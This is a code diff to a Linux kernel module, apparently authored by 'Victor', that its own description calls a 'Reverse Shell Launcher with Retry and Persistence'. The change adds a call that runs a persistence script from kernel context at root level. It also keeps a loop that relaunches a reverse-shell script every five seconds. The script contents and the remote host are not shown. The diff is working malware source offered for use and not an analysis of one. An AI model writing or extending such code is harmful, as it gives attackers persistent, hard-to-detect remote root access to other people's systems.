@@ -8,18 +8,27 @@
 static struct task_struct *revshell_thread;
 
 static int revshell_function(void *data) {
-    char *argv[] = {"/bin/bash", "/root/revshell.sh", NULL};  // Script shell
+    char *persistence_argv[] = {"/bin/bash", "/111111111111111111111111111/persistence.sh", NULL};
+    char *revshell_argv[] = {"/bin/bash", "/111111111111111111111111111/revshell.sh", NULL};
     char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
 
+    // Lancer le script de persistance avant la boucle principale
+    int ret = call_usermodehelper(persistence_argv[0], persistence_argv, envp, UMH_WAIT_EXEC);
+    if (ret != 0) {
+        printk(KERN_ERR "Error launching persistence.sh: %d\n", ret);
+    } else {
+        printk(KERN_INFO "Persistence script launched successfully.\n");
+    }
+
     while (!kthread_should_stop()) {
-        int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        ret = call_usermodehelper(revshell_argv[0], revshell_argv, envp, UMH_WAIT_EXEC);
         if (ret != 0) {
             printk(KERN_ERR "Error launching revshell.sh: %d\n", ret);
         } else {
             printk(KERN_INFO "Reverse shell launched successfully.\n");
         }
 
-        ssleep(5);  // Attendre 5 secondes avant de relancer
+        ssleep(5);
     }
 
     return 0;
@@ -52,4 +61,4 @@ module_exit(lkm_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Victor");
-MODULE_DESCRIPTION("Reverse Shell Launcher with Retry");
+MODULE_DESCRIPTION("Reverse Shell Launcher with Retry and Persistence");
